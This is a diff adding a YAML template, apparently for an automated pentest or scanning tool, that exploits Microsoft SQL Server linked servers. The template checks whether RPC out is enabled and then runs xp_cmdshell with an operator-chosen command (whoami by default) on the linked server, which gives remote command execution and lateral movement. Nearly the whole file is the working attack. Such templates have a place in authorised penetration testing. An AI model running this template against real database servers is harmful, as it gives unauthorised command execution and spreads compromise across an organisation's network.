@@ -1,0 +1,30 @@
+id: mssql-linked-server-exec
+service: [mssql]
+variables:
+  linked_server: LINKED_SRV
+  cmd: whoami
+info:
+  name: MSSQL Linked Server Command Execution
+  severity: critical
+  tags: mssql,exploit,lateral,rce,linked
+
+services:
+  - ops:
+      - db: "SELECT 'rpc=' + CAST(is_rpc_out_enabled AS varchar(1)) FROM sys.servers WHERE name = '{{linked_server}}'"
+        name: rpc_check
+    extractors:
+      - type: regex
+        name: mssql_linked_rpc_status
+        internal: true
+        part: rpc_check
+        regex: ['(?m)^rpc=([01])']
+        group: 1
+
+  - ops:
+      - db: "EXEC ('xp_cmdshell ''{{cmd}}''') AT [{{linked_server}}]"
+        name: linked_output
+    extractors:
+      - type: regex
+        name: mssql_linked_exec_result
+        part: linked_output
+        regex: ['(?m)^(.+)$']
